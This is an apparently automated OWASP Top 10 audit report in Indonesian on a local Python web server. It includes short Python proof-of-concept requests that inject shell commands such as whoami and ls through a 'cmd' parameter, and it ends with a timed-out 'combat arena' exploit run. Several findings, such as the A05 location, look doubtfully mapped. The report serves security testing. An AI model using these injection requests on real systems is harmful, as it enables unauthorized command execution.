## A01 - Broken Access Control: FOUND
Lokasi spesifik di kode: `if "cmd" in query:`
PoC exploit code:
```python
import requests

url = "http://localhost:5000/?cmd=whoami"
response = requests.get(url)
print(response.text)
```
CVSS score: 8.0
Dampak nyata jika dieksploitasi: Menggunakan kerentanan ini, penyerang dapat menjalankan perintah sistem sehingga dapat mengakses informasi sensitif.

## A02 - Cryptographic Failures: NOT FOUND
Tidak ditemukan kerentanan cryptographic failures di kode sumber.

## A03 - Injection: FOUND
Lokasi spesifik di kode: `output = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.STDOUT)`
PoC exploit code:
```python
import requests

url = "http://localhost:5000/?cmd=echo%20Hello%20World"
response = requests.get(url)
print(response.text)

# contoh injeksi command
url = "http://localhost:5000/?cmd=ls%20-l"
response = requests.get(url)
print(response.text)
```
CVSS score: 9.0
Dampak nyata jika dieksploitasi: Menggunakan kerentanan ini, penyerang dapat menjalankan perintah sistem sehingga dapat mengakses informasi sensitif dan melakukan aksi malicious lainnya.

## A04 - Insecure Design: NOT FOUND
Tidak ditemukan kerentanan insecure design di kode sumber.

## A05 - Security Misconfiguration: FOUND
Lokasi spesifik di kode: `self.send_response(200)`
PoC exploit code:
```python
import requests

url = "http://localhost:5000/?cmd=non-existent-command"
response = requests.get(url)
print(response.text)
```
CVSS score: 6.0
Dampak nyata jika dieksploitasi: Menggunakan kerentanan ini, penyerang dapat memahami struktur dan konfigurasi sistem sehingga dapat melakukan serangan lebih lanjut.

## A06 - Vulnerable Components: NOT FOUND
Tidak ditemukan kerentanan vulnerable components di kode sumber.

## A07 - Auth & Session Failures: NOT FOUND
Tidak ditemukan kerentanan auth & session failures di kode sumber.

## A08 - Software Integrity Fails: NOT FOUND
Tidak ditemukan kerentanan software integrity fails di kode sumber.

## A09 - Logging & Monitoring Fail: FOUND
Lokasi spesifik di kode: tidak ada logging yang efektif
PoC exploit code:
```python
import requests

url = "http://localhost:5000/?cmd=non-existent-command"
response = requests.get(url)
print(response.text)
```
CVSS score: 4.0
Dampak nyata jika dieksploitasi: Menggunakan kerentanan ini, penyerang dapat melakukan serangan tanpa terdeteksi oleh sistem logging.

## A10 - SSRF: NOT FOUND
Tidak ditemukan kerentanan SSRF di kode sumber.

## RINGKASAN:
- Kerentanan ditemukan: 4/10 kategori OWASP
- CVSS tertinggi: 9.0 - Injection
- Attack vector paling efektif: Kerentanan injection pada parameter cmd
- Estimated time-to-exploit: Tinggi, karena kerentanan yang ditemukan memungkinkan penyerang untuk menjalankan perintah sistem dan mengakses informasi sensitif.

### [LIVE COMBAT ARENA - EXPLOIT RESULT]
Status: timeout
Stdout:
```

```
Stderr:
```
Exploit timeout setelah 15 detik
```
